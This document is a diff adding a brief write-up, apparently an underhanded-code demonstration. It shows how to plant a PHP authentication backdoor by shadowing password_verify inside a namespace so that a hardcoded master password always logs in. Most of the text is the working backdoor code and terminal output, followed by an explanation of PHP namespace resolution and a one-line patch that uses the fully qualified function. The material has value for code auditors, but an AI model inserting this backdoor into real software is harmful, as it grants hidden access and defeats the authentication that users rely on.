@@ -1,0 +1,53 @@
+Here's a quick and dirty way to slip a backdoor into a PHP project by abusing Namespaces.
+
+POC:
+
+root@ssh:~/underhanded# php index.php
+SUCCESS
+root@ssh:~/underhanded# cat index.php
+<?php
+namespace Framework;
+
+require_once "login.php";
+
+$plain = base64_encode(mcrypt_create_iv(63, MCRYPT_DEV_URANDOM));
+$hash = password_hash($plain, PASSWORD_DEFAULT);
+
+if (password_verify('IndictClapper4Perjury', $hash)) {
+        echo "SUCCESS\n";
+} else {
+        echo "FAILURE\n";
+}
+root@ssh:~/underhanded# cat login.php
+<?php
+namespace Framework;
+
+function password_verify($password, $hash)
+{
+        if ($password === 'IndictClapper4Perjury') {
+                return true;
+        }
+        return \password_verify($password, $hash);
+}
+root@ssh:~/underhanded#
+
+Explanation:
+
+You can log in with either the correct password, or the password 'IndictClapper4Perjury' (sans quotes).
+
+Because password_verify() is defined in the namespace "Framework", if the call to password_verify() (inside of the context of the "Framework" namespace) is not preceded by a backslash, PHP will by default look in the current namespace then check the global namespace. Silently.
+
+
+i.e. it will attempt in this order
+
+1. \Framework\password_verify()
+2. \password_verfiy()
+
+If you comment out the require_once "login.php"; line, you can still log in with the proper password.
+
+Patch for index.php:
+
+- if (password_verify('IndictClapper4Perjury', $hash)) {
++ if (\password_verify('IndictClapper4Perjury', $hash)) {
+
+It's a very easy mistake to miss, unless the code auditor is intimately familiar with how PHP implements namespaces.
